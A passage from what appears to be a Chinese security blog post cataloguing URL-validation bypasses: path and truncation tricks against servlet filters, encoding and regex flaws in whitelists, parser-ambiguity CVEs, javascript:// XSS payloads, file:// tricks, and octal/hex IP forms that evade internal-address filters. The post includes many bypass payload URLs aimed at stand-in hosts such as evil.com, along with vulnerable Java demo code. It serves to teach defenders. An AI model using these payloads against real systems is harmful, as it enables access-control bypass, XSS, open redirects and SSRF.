class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">    HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">    String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (url.startsWith(<span class="string">"/login.jsp"</span>) || url.endsWith(<span class="string">"logout.jsp"</span>)) &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对startsWith()的认证绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/login.jsp/../urltest/info/secret.jsp</span><br></pre></td></tr></table></figure><p>针对endsWith()的认证绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/urltest/info/secret.jsp;logout.jsp</span><br></pre></td></tr></table></figure><p>此外，<code>//</code>和<code>./</code>也可以绕过一些以特定字符串开头的访问控制，比如代码使用<code>URI.startsWith(&quot;/admin/&quot;)</code>判断以/admin/开头的URI都要进行认证鉴权，那么攻击者构造<code>//admin/</code>、<code>/./admin/</code>、<code>/admin;test/</code>开头的URL都可以绕过访问控制。</p><h2 id="0x03-利用截断绕过（-）"><a href="#0x03-利用截断绕过（-）" class="headerlink" title="0x03 利用截断绕过（;@#?）"></a>0x03 利用截断绕过（;@#?）</h2><p>常用于截断绕过的几个字符：<code>;@#?</code></p><p>假设原始访问URL为<code>http://www.mi1k7ea.com/urltest/index.jsp</code>，绕过技巧如下：</p><table><thead><tr><th>截断符号</th><th>构造的URL</th></tr></thead><tbody><tr><td>;</td><td><code>http://www.mi1k7ea.com/urltest/index.jsp;logout.jsp</code></td></tr><tr><td>;</td><td><code>http://www.mi1k7ea.com/urltest/;/index.jsp</code></td></tr><tr><td>@</td><td><code>http://www.mi1k7ea.com@www.evil.com/urltest/index.jsp</code></td></tr><tr><td>@</td><td><code>http://@@www.mi1k7ea.com/urltest/index.jsp</code></td></tr><tr><td>#</td><td><code>http://www.evil.com#www.mi1k7ea.com/urltest/index.jsp</code></td></tr><tr><td>?</td><td><code>http://www.evil.com?www.mi1k7ea.com/urltest/index.jsp</code></td></tr><tr><td>\</td><td><code>http://www.mi1k7ea.com.evil.cn\@mi1k7ea.com</code></td></tr></tbody></table><p>注意，两个@在URI中表示无法解析得到Host部分而进入到错误分支。</p><p><strong>Demo——@@</strong></p><p>这里在调用getHost()函数尝试获取@@开头的URI的Host时会解析错误，返回的Host为空，进入错误分支的代码逻辑，如果该分支存在危险操作则会被攻击利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url = <span class="string">"https://@@www.mi1k7ea.com/"</span>;</span><br><span class="line">        URI uri = <span class="keyword">new</span> URI(url);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(uri.getHost()))&#123;</span><br><span class="line">            System.out.println(<span class="string">"Okay"</span>);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                do some dangerous things</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/1.png" alt=""></p><h2 id="0x04-利用编码绕过"><a href="#0x04-利用编码绕过" class="headerlink" title="0x04 利用编码绕过"></a>0x04 利用编码绕过</h2><p>使用部分编码后的URL，如果服务端未经过解码或标准化处理就传入校验器，那么可以绕过ACL。</p><p>假设原始访问URL为<code>http://www.mi1k7ea.com/urltest/index.jsp</code>，绕过技巧如下：</p><table><thead><tr><th style="text-align:left">编码方式</th><th style="text-align:left">构造的URL</th></tr></thead><tbody><tr><td style="text-align:left">URL</td><td style="text-align:left"><code>http://www.mi1k7ea.com/urltest/%69%6e%64%65%78%2e%6a%73%70</code></td></tr><tr><td style="text-align:left">Base64</td><td style="text-align:left"><code>http://www.mi1k7ea.com/urltest/aW5kZXguanNw</code></td></tr><tr><td style="text-align:left">Unicode</td><td style="text-align:left"><code>http://www.mi1k7ea.com.evil.cn\111.mi1k7ea.com@www.mi1k7ea.com</code></td></tr><tr><td style="text-align:left">Unicode</td><td style="text-align:left"><code>http://evil.cn\u2100B.mi1k7ea.com/</code></td></tr></tbody></table><p>当服务器中的解码器遇到大于ASCII范围的字符时，它将尝试使用Unicode编码进行解码操作，整个解码过程会有错误出现：</p><p><img src="/2020/04/13/URL-Bypass总结/3.png" alt=""></p><p><img src="/2020/04/13/URL-Bypass总结/4.png" alt=""></p><p><strong>Demo——URL编码</strong></p><p>当未对URL进行标准化或解码处理，且程序使用endsWith()、contains()等弱校验时，可以利用URL编码绕过。</p><p>直接修改前面的testFilter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        String url = httpServletRequest.getRequestURI();</span><br><span class="line"><span class="comment">//        String url = Normalizer.normalize(url0,  Normalizer.Form.NFKC);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (url.endsWith(<span class="string">"/urltest/info/secret.jsp"</span>)) &#123;</span><br><span class="line">            httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里使用URL编码就能成功绕过：</p><p><img src="/2020/04/13/URL-Bypass总结/5.png" alt=""></p><p>绕过原因在于，getRequestURI()和getRequestURL()函数未对输入的URL进行URL解码操作，但程序实际获取到的就是解码后的URL：</p><p><img src="/2020/04/13/URL-Bypass总结/2.png" alt=""></p><h2 id="0x05-白名单配置不当导致绕过（前后未闭合）"><a href="#0x05-白名单配置不当导致绕过（前后未闭合）" class="headerlink" title="0x05 白名单配置不当导致绕过（前后未闭合）"></a>0x05 白名单配置不当导致绕过（前后未闭合）</h2><p>程序使用URL白名单过滤URL，如果URL白名单配置不当，则可被攻击者绕过，比如缺少<code>.</code>、<code>/</code>来闭合域名的前后。</p><ul><li>当使用startsWith()函数校验白名单域名，但缺少<code>/</code>来闭合域名后面时存在绕过风险；</li><li>当使用endsWith()函数校验白名单域名，但缺少<code>.</code>来闭合域名前面时存在绕过风险；</li></ul><p><strong>Demo——startsWith()</strong></p><p>比如白名单域名尾部未使用<code>/</code>来闭合，并且使用startsWith()函数校验白名单域名，则可以使用<code>@</code>拼接恶意URL来绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url_whitelist = <span class="string">"https://www.mi1k7ea.com"</span>;</span><br><span class="line">        String evil_url = <span class="string">"https://www.mi1k7ea.com@www.evil.cn/"</span>;</span><br><span class="line">        <span class="keyword">if</span> (evil_url.startsWith(url_whitelist)) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/6.png" alt=""></p><p><strong>Demo——endsWith()</strong></p><p>比如白名单域名头部未使用<code>.</code>来闭合，并且使用endsWith()函数校验白名单域名，则攻击者只需注入如<code>evilmi1k7ea.com</code>的域名即可绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url_whitelist = <span class="string">"mi1k7ea.com"</span>;</span><br><span class="line">        String evil_url = <span class="string">"https://evilmi1k7ea.com"</span>;</span><br><span class="line">        <span class="keyword">if</span> (evil_url.endsWith(url_whitelist)) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/7.png" alt=""></p><h2 id="0x06-正则校验绕过"><a href="#0x06-正则校验绕过" class="headerlink" title="0x06 正则校验绕过"></a>0x06 正则校验绕过</h2><p>URL白名单如果使用了正则表达式中的特殊字符<code>$()*+.[?\^{|</code>，且这些字符未做转义处理的话（比如<code>.</code>用<code>\.</code>转义），则可能存在正则被绕过的风险。</p><p><strong>Demo——“.”未转义</strong></p><p>例如，URL白名单中的<code>https://www.mi1k7ea.com</code>中包含<code>.</code>，由于未转义该字符，且该字符在正则表达式中可以代表任意单个字符，因此攻击者可以构造<code>https://wwwxmi1k7ea.com</code>来绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url_whitelist = <span class="string">"https://www.mi1k7ea.com"</span>;</span><br><span class="line">        String evil_url = <span class="string">"https://wwwxmi1k7ea.com"</span>;</span><br><span class="line">        StringBuilder PattStr = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        PattStr.append(<span class="string">"([A-Za-z0-9.-]*\\."</span>).append(url_whitelist).append(<span class="string">"|"</span>).append(url_whitelist);</span><br><span class="line">        PattStr.append(<span class="string">")($|(.*)|\\?.*)"</span>);</span><br><span class="line">        System.out.println(PattStr);</span><br><span class="line">        <span class="keyword">if</span> (Pattern.compile(PattStr.toString()).matcher(evil_url).matches()) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/8.png" alt=""></p><p><strong>Demo——“^”未转义</strong></p><p>例如，使用正则表达式匹配以js的开头的URI就直接放行，此时攻击者可构造<code>/js/../urltest/info/secret.jsp</code>的URL请求实现绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">    HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">    HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">    String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">    if (Pattern.compile(&quot;^/(js)/.*$&quot;).matcher(url).matches()) &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        httpServletResponse.getWriter().write(&quot;No Permission.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/9.png" alt=""></p><h2 id="0x07-域名校验绕过（未校验整个域名，包含模式）"><a href="#0x07-域名校验绕过（未校验整个域名，包含模式）" class="headerlink" title="0x07 域名校验绕过（未校验整个域名，包含模式）"></a>0x07 域名校验绕过（未校验整个域名，包含模式）</h2><p>在进行域名校验时，如果只校验域名的其中一部分，那么可能会导致被绕过的风险。具体的为在业务中使用的是contains()函数进行弱校验。</p><p><strong>Demo</strong></p><p>仅使用contains()弱校验函数进行URL白名单校验导致被绕过，比如攻击者搭建一个域名为<code>www.mi1k7ea.co</code>的网站即可绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI uri = <span class="keyword">new</span> URI(<span class="string">"https://www.mi1k7ea.co/exp"</span>);</span><br><span class="line">        String whitelist = <span class="string">"www.mi1k7ea.com"</span>;</span><br><span class="line">        System.out.println(uri.getHost());</span><br><span class="line">        <span class="keyword">if</span> (whitelist.contains(uri.getHost())) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/10.png" alt=""></p><h2 id="0x08-二义性绕过"><a href="#0x08-二义性绕过" class="headerlink" title="0x08 二义性绕过"></a>0x08 二义性绕过</h2><p>二义性绕过是指浏览器与后端服务器或者前端服务器与后端服务器之间解析URL时存在差异导致的绕过。</p><p><strong>CVE-2017-13274</strong></p><p>该CVE主要是服务端和浏览器侧的认知不一致导致的。</p><p>外部传入URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.evil.cn\\www.mi1k7ea.com/urltest/index.jsp</span><br></pre></td></tr></table></figure><p>在服务端使用getHost()函数解析获取Host，此时获取到的Host部分为<code>www.evil.cn\\www.mi1k7ea.com</code>，在如下校验中通过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"www.mi1k7ea.com"</span>.endsWith(<span class="string">"www.evil.cn\\www.mi1k7ea.com"</span>)</span><br></pre></td></tr></table></figure><p>但是在浏览器侧，实际解析到的URL为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.evil.cn/www.mi1k7ea.com/urltest/index.jsp</span><br></pre></td></tr></table></figure><p>因此，成功绕过了校验。</p><p><strong>CVE-2017-13176</strong></p><p>同样是服务端和浏览器侧的认知不一致导致的。</p><p>外部传入URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://a:a@www.mi1k7ea.com:b@www.evil.cn/urltest/index.jsp</span><br></pre></td></tr></table></figure><p>在服务端使用getHost()函数解析获取Host，此时获取到的Host部分为<code>www.mi1k7ea.com</code>，在如下校验中通过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"www.mi1k7ea.com"</span>.equal(<span class="string">"www.mi1k7ea.com"</span>)</span><br></pre></td></tr></table></figure><p>但是在浏览器侧，实际解析到的URL为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.evil.cn/urltest/index.jsp</span><br></pre></td></tr></table></figure><p>因此，成功绕过了校验。</p><p><strong>不同浏览器认知不一致</strong></p><p>对于外部传入URL：<code>https://www.evil.cn\www.mi1k7ea.com/urltest/index.jsp</code></p><table><thead><tr><th>浏览器内核</th><th>代表产品</th><th>解析出的Host部分</th></tr></thead><tbody><tr><td>Trident</td><td>IE</td><td><a href="http://www.evil.cn" target="_blank" rel="noopener">www.evil.cn</a></td></tr><tr><td>Gecko</td><td>Firefox</td><td><a href="http://www.mi1k7ea.com">www.mi1k7ea.com</a></td></tr><tr><td>WebKit</td><td>Safari/Chrome</td><td><a href="http://www.evil.cn" target="_blank" rel="noopener">www.evil.cn</a></td></tr><tr><td>Presto</td><td>Opera</td><td><a href="http://www.evil.cn" target="_blank" rel="noopener">www.evil.cn</a></td></tr></tbody></table><p>注意：表格的结果和浏览器版本有关，具体的以实际返回结果为准。</p><p>推荐使用BrowserStack模拟各个版本的浏览器。</p><p>假设redirect_uri=auth.app.com.evil.com，绕过方式如下（能否成功与浏览器版本有关，以实际返回结果为准）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auth.app.com.evil.com</span><br><span class="line">evil.com?auth.app.com</span><br><span class="line">evil.com?@auth.app.com</span><br><span class="line">auth.app.com@evil.com</span><br><span class="line">auth.app.com\@evil.com</span><br><span class="line">evil.com\auth.app.com</span><br><span class="line">evil.com:\auth.app.com</span><br><span class="line">evil.com\.auth.app.com</span><br><span class="line">evil.com:\@auth.app.com</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="0x09-scheme校验绕过"><a href="#0x09-scheme校验绕过" class="headerlink" title="0x09 scheme校验绕过"></a>0x09 scheme校验绕过</h2><h3 id="“http-”与”-“之间"><a href="#“http-”与”-“之间" class="headerlink" title="“http:”与”//“之间"></a>“http:”与”//“之间</h3><p>在浏览器中，”http:”与”//“之间（包括在两个斜杠之间），是可以插入反斜杠<code>\</code>的，并不会影响对URL的请求。</p><p>因此利用这个特性可以绕过一些针对Scheme的过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:\//www.evil.com</span><br><span class="line">http:\\\//www.evil.com</span><br><span class="line">http:/\/www.evil.com</span><br><span class="line">http:/\\\/www.evil.com</span><br><span class="line">/\/www.evil.com</span><br></pre></td></tr></table></figure><p>上述URL最终在浏览器中都被解析为<code>http://www.evil.com</code>来访问。</p><p><strong>Demo</strong></p><p>比如，下面开发实现的通过识别scheme关键字来截取外部URL的Host代码中存在缺陷，可被绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url = <span class="string">"https:www.evil.cn/?https://www.mi1k7ea.com/"</span>;</span><br><span class="line">        String url2 = url.substring(url.indexOf(<span class="string">"://"</span>) + <span class="number">3</span>);</span><br><span class="line">        String url3 = url2.substring(<span class="number">0</span>, url2.indexOf(<span class="string">"/"</span>));</span><br><span class="line">        System.out.println(url);</span><br><span class="line">        System.out.println(<span class="string">"最终解析得到的Host为："</span> + url3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/11.png" alt=""></p><h3 id="大小写不统一"><a href="#大小写不统一" class="headerlink" title="大小写不统一"></a>大小写不统一</h3><p>在某些情况下，开发人员使用白名单校验URL或者scheme时，并未对传入的数据进行统一的大小写转换，此时就能通过大小写来绕过。</p><h3 id="追加和替换"><a href="#追加和替换" class="headerlink" title="追加和替换"></a>追加和替换</h3><p>有时候，开发人员为了防止HTTP传输被劫持，会给传入的URL追加<code>https://</code>等。为了与服务端远程连接，会匹配自定义scheme来替换为HTTP协议。</p><table><thead><tr><th>类型</th><th>外部输入URL</th><th>实际解析得到的URL</th></tr></thead><tbody><tr><td>追加</td><td>evil.cn://mi1k7ea.com/attack.html</td><td><a href="https://evil.cn://mi1k7ea.com/attack.html" target="_blank" rel="noopener">https://evil.cn://mi1k7ea.com/attack.html</a></td></tr><tr><td>替换</td><td>imdb://evil.cn/attack.html</td><td><a href="https://evil.cn/attack.html" target="_blank" rel="noopener">https://evil.cn/attack.html</a></td></tr></tbody></table><h2 id="0x0A-未校验scheme只校验Host部分"><a href="#0x0A-未校验scheme只校验Host部分" class="headerlink" title="0x0A 未校验scheme只校验Host部分"></a>0x0A 未校验scheme只校验Host部分</h2><p>一般的，在实现URL白名单校验时，使用getHost()获得域名部分后进行对比。但是如果没有校验URL中的协议部分（getScheme），则会存在伪协议绕过、HTTP劫持等问题。</p><table><thead><tr><th>注入的payload</th><th>安全风险</th></tr></thead><tbody><tr><td>JavaScript://<a href="http://www.mi1k7ea.com/%0a%0dalert(0)//">www.mi1k7ea.com/%0a%0dalert(0)//</a></td><td>XSS</td></tr><tr><td>JavaScript://<a href="http://www.mi1k7ea.com/%0a%0dlocation=&#39;//www.evil.cn//&#39;//">www.mi1k7ea.com/%0a%0dlocation=&#39;//www.evil.cn//&#39;//</a></td><td>任意URL跳转</td></tr><tr><td>file://<a href="http://www.mi1k7ea.com//sdcard/evil.html">www.mi1k7ea.com//sdcard/evil.html</a></td><td>注入本地恶意代码</td></tr><tr><td><a href="http://www.mi1k7ea.com/H5_game.html">http://www.mi1k7ea.com/H5_game.html</a></td><td>篡改返回报文</td></tr></tbody></table><p>如上特殊URL获取到的Host部分都是<code>www.mi1k7ea.com</code>，但实际在WebView或浏览器中加载时会有不同的行为。</p><p><strong>Demo——JavaScript://</strong></p><p>本示例可看出仅仅校验Host部分是不安全的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI evil_url = <span class="keyword">new</span> URI(<span class="string">"javascript://www.mi1k7ea.com/%0a%0dalert(0)//"</span>);</span><br><span class="line">        String whitelist = <span class="string">"www.mi1k7ea.com"</span>;</span><br><span class="line">        String host = evil_url.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host.endsWith(whitelist)) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/URL-Bypass总结/12.png" alt=""></p><h2 id="0x0B-file协议绕过"><a href="#0x0B-file协议绕过" class="headerlink" title="0x0B file协议绕过"></a>0x0B file协议绕过</h2><p>当产品要加载的是本地页面，但是对本地页面进行了白名单限制，此时可根据白名单实现逻辑来看情况绕过：</p><table><thead><tr><th>白名单校验实现伪代码</th><th>外部传入的绕过payload</th></tr></thead><tbody><tr><td>startsWith(“file:///data/data/com.mi1k7ea”)</td><td>file:///data/data/com.mi1k7ea/../sdcard/evil.html</td></tr><tr><td>startsWith(“file:///android_asset”)</td><td>file:///android_assetevil/../sdcard/evil.html</td></tr><tr><td>Uri.getHost().equals(“<a href="http://www.mi1k7ea.com&quot;">www.mi1k7ea.com&quot;</a>)</td><td>file://<a href="http://www.mi1k7ea.com/sdcard/evil.html">www.mi1k7ea.com/sdcard/evil.html</a></td></tr><tr><td>Uri.getHost().endsWith(“<a href="http://www.mi1k7ea.com&quot;">www.mi1k7ea.com&quot;</a>)</td><td>file://<a href="http://www.mi1k7ea.com/sdcard/evil.html">www.mi1k7ea.com/sdcard/evil.html</a></td></tr><tr><td></td><td>file:/data/data/com.mi1k7ea/</td></tr><tr><td></td><td><code>file:/\\\\//data/data/com.mi1k7ea/</code></td></tr></tbody></table><p>如上特殊URL解析获取的Host部分均为<code>www.mi1k7ea.com</code>，但实际上在WebView或浏览器中加载时会有不同的行为。</p><h2 id="0x0C-IP地址绕过"><a href="#0x0C-IP地址绕过" class="headerlink" title="0x0C IP地址绕过"></a>0x0C IP地址绕过</h2><h3 id="进制转换绕过"><a href="#进制转换绕过" class="headerlink" title="进制转换绕过"></a>进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p><ul><li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li><li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li><li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li></ul><p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>16进制整数格式：0xC0A80001</li><li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li></ul><p>其他特殊形式：</p><ul><li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li><li>0.0.0.0可以直接访问到本地；</li></ul><h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" 